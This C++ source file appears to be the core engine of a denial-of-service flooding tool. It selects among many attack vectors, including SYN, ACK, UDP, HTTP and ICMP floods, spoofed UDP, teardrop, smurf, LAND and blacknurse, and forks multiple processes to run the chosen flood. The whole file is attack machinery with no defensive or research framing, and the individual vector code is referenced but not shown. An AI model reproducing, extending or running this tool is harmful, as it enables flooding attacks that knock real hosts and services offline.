#include "engine.h"
#include "vectors.h"

#include <memory>
#include <unistd.h>

#include <spdlog/spdlog.h>

engine::engine(std::shared_ptr<Config> config) {
  std::unique_ptr<Vector> flood{[&]() -> Vector * {
    switch (config->vec) {
    case TCP_FLOOD:
      return new tcp_flood(config);
    case UDP_FLOOD:
      return new udp_flood(config);
    case NULL_TCP:
      return new null_tcp(config);
    case NULL_UDP:
      return new null_udp(config);
    case HTTP_FLOOD:
      return new http_flood(config);
    case ICMP_FLOOD:
      return new icmp_flood(config);
    case SYN_FLOOD:
      return new syn_flood(config);
    case ACK_FLOOD:
      return new ack_flood(config);
    case FIN_FLOOD:
      return new fin_flood(config);
    case SPOOFED_UDP_FLOOD:
      return new spoofed_udp_flood(config);
    case TEARDROP:
      return new teardrop(config);
    case BLACKNURSE:
      return new blacknurse(config);
    case LAND:
      return new land(config);
    case SMURF:
      return new smurf(config);
    default:
      spdlog::get("logger")->error("invalid Vector selected");
      exit(EXIT_FAILURE);
    }
  }()};

  for (int i = 0; i < config->trds; ++i) {
    if (fork())
      flood->run();
  }
}
